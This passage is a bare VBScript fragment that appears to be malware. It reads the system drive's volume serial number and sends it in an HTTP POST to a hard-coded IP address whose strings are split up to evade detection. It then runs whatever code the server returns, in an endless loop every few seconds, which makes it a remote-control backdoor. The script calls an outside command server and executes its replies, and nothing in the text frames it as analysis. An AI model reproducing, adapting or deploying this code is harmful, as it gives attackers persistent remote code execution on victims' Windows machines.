...
Set winmgmtObject = GetObject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")

Set niceQuery = winmgmtObject.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DeviceId='" & wscript.createobject("wscript.shell").ExpandEnvironmentStrings("%SYSTEMDRIVE%") & "'")

On Error Resume Next
for each query In niceQuery
img = query.VolumeSerialNumber
Next:posty="p"&"ost"
while true
on error resume next

httpObject.open posty, "h" & "ttp:" & "//" & 120+28 & ".1" & 10+3 & ".1" & "65." & 2+9 & ":" & "8" & "0" & "/" & "d" & "oc" & "um" & "ent", False
httpObject.setrequestheader "us" & "er-" & "agent:",img
httpObject.send
on error resume next

execute split(httpObject.responseText,"|>")(1)
wscript.sleep 3400
wend
